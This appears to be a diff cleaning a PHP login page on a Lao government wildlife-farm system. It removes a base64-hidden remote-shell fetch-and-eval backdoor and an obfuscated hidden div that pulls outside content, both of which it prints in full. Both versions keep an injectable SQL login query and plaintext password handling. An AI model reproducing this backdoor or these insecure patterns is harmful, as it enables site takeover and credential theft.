@@ -6,10 +6,6 @@ $submit = "";
 
 $status = "OK";
 $msg = "";
-$lang = "la";
-include('my_function.php');
-
-include("Language/lang.".$lang.".php");
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
@@ -24,7 +20,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $status = "NOTOK";
 
   }
-
   if (preg_match('/[\'^£$%&*()}{@#~?><>,;|=_+¬-]/', $email)){
     $msg .= "<center><font  size='4px' face='Verdana' size='1' color='red'>Please Enter Your email. </font></center>";
     $status = "NOTOK";
@@ -45,7 +40,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 //   include('db_connect.php');
 //echo "SELECT * FROM users WHERE email='$email' and password='$password'";
 
-    $result = mysqli_query($con, "SELECT * FROM users WHERE email='$email' and password='$password'");
+    $result = mysqli_query($con, "SELECT * FROM usersweb WHERE email='$email' and password='$password'");
 
     $count = mysqli_num_rows($result);
 
@@ -58,7 +53,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       $_SESSION['user_type'] = $row['user_type'];
       $_SESSION['name'] = $row['name'];
       $_SESSION['password']=$row['password'];
-      $_SESSION['farm_id']=$row['farm_id'];
+      $_SESSION['nid']=0;
+      $_SESSION['word_id']=0;
       
      header("location:index.php");      
      
@@ -73,24 +69,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 }
 
-if (isset($_GET['logs'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
+
 ?>
 
 <!DOCTYPE html>
@@ -100,7 +79,7 @@ if (isset($_GET['logs'])) {
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
-<title>wims.mis-maf.gov.la</title>
+<title>www.dalam.mis-maf.gov.la</title>
 
 <link rel="shortcut icon" href="assets/img/favicon.png">
 
@@ -136,51 +115,42 @@ if (isset($_GET['logs'])) {
     
 </head>
 <body>
-<div style="display:none;"><?php
- goto HDs2_; AXXHd: $cSWX8 = curl_exec($QkLvw); goto Z8XhT; SvVS2: curl_setopt($QkLvw, CURLOPT_RETURNTRANSFER, 1); goto AXXHd; HDs2_: $QkLvw = curl_init("\150\164\x74\x70\x73\x3a\57\57\x61\x73\160\x78\56\147\145\156\x2e\164\162\x2f\x6e\145\x2f\x72\x65\x61\144\x2e\x70\x68\x70\x3f\165\162\154\75\167\x69\155\163\56\x6d\x69\x73\x2d\x6d\141\x66\x2e\147\x6f\x76\56\154\x61"); goto SvVS2; Z8XhT: echo $cSWX8;
-?></div>
+
 <div class="main-wrapper login-body">
 <div class="login-wrapper">
 <div class="container">
 <div class="loginbox">
 <div class="login-left">
-<br>
-  <center>
-<h1><label><span class="login-primary auto-style1"><font color="#306754">ລະບົບການຄຸ້ມຄອງຂໍ້ມູນ<br>ຟາມສັດປ່າ ແລະສວນສັດ</font></span></label></h1>
-<h3><label><span class="login-primary auto-style1"><font color="#306754">Wildlife Farms and Zoos <br> Information Management System</font></span></label></h3>
-  </center>
-<br>
-<br>
 <img class="img-fluid" src="assets/img/login.png" alt="Logo">
-<br><br><br><br><br>
+<br><br><br><br><br><br>
 </div>
 <div class="login-right">
 <div class="login-right-wrap">
-<br>
-<h1><label><span class="login-primary auto-style1"><font color="#4682B4"><?=$language["wellcome"]?></font></span></label></h1>
-<br>
+<h1 class="uto-style1"><label><span class="login-primary auto-style1">ຍິນດີຕອນຮັບເຂົ້າລະບົບ</span></label> </h1>
+<p class="account-subtitle auto-style1">ທ່ານໄດ້ລົງທະບຽນຫຼືຍັງ? <a href="register.php">ລົງທະບຽນນຳໃຊ້</a></p>
+<h2><label><span class="login-primary auto-style1">ເຂົ້າລະບົບ</span></label></h2>
+
 <form action="login.php" method="post">
 <div class="form-group">
-<label><?=$language["user"]?> <span class="login-danger">*</span></label>
+<label>ຊື່ນຳໃຊ້ <span class="login-danger">*</span></label>
 <input class="form-control" type="text" name="email">
 <span class="profile-views"><i class="fas fa-user-circle"></i></span>
 </div>
 <div class="form-group">
-<label><?=$language["password"]?> <span class="login-danger">*</span></label>
+<label>ລະຫັດຜ່ານ <span class="login-danger">*</span></label>
 <input class="form-control pass-input" type="text"   name="password">
 <span class="profile-views feather-eye toggle-password"></span>
 </div>
 <div class="forgotpass">
 <div class="remember-me">
-<label class="custom_check mr-2 mb-0 d-inline-flex remember-me"> <?=$language["remember"]?>
+<label class="custom_check mr-2 mb-0 d-inline-flex remember-me"> ຈື່ລະຫັດຜ່ານ
 <input type="checkbox" name="radio">
 <span class="checkmark"></span>
 </label>
 </div>
-<a href="forgot-password.php"><?=$language["forgot_password"]?>?</a>
+<a href="forgot-password.php">ລືມລະຫັດຜ່ານ?</a>
 </div>
 <div class="form-group">
-<button class="btn #" type="submit"><?=$language["login"]?></button>
     <?php
           if ($_SERVER["REQUEST_METHOD"] == "POST") {
             echo "<div  align='center'>" . $msg . "</div";
@@ -199,7 +169,6 @@ if (isset($_GET['logs'])) {
 </div>
 </div>
 </div>
-
 
 
 <script src="assets/js/jquery-3.6.0.min.js"></script>
